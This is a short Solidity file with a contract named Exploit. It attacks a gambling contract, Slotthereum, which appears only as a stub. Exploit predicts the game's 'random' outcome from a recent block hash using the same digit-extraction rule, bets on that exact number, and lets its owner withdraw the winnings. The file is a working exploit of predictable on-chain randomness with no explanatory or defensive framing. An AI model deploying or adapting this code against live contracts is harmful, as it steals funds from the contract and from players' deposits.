1 // 224109999999999995 * 10 / 9 = x
2 
3 contract Slotthereum {
4     function placeBet(uint8 start, uint8 end) public payable returns (bool) {
5     }
6 }
7 
8 contract Exploit {
9     address owner;
10     uint8 pointer;
11     Slotthereum target;
12     
13     function Exploit() {
14         owner = msg.sender;
15     }
16     
17     function attack(address a, uint8 n) payable {
18         Slotthereum target = Slotthereum(a);
19         pointer = n;
20         uint8 win = getNumber(getBlockHash(pointer));
21         target.placeBet.value(msg.value)(win, win);
22     }
23     
24     function () payable {
25         
26     }
27     
28     function withdraw() {
29         require(msg.sender == owner);
30         msg.sender.transfer(this.balance);
31     }
32     
33     function getBlockHash(uint i) internal constant returns (bytes32 blockHash) {
34         if (i >= 255) {
35             i = 255;
36         }
37         if (i <= 0) {
38             i = 1;
39         }
40         blockHash = block.blockhash(block.number - i);
41     }
42     
43     function getNumber(bytes32 _a) internal constant returns (uint8) {
44         uint8 mint = pointer;
45         for (uint i = 31; i >= 1; i--) {
46             if ((uint8(_a[i]) >= 48) && (uint8(_a[i]) <= 57)) {
47                 return uint8(_a[i]) - 48;
48             }
49         }
50         return mint;
51     }
52 }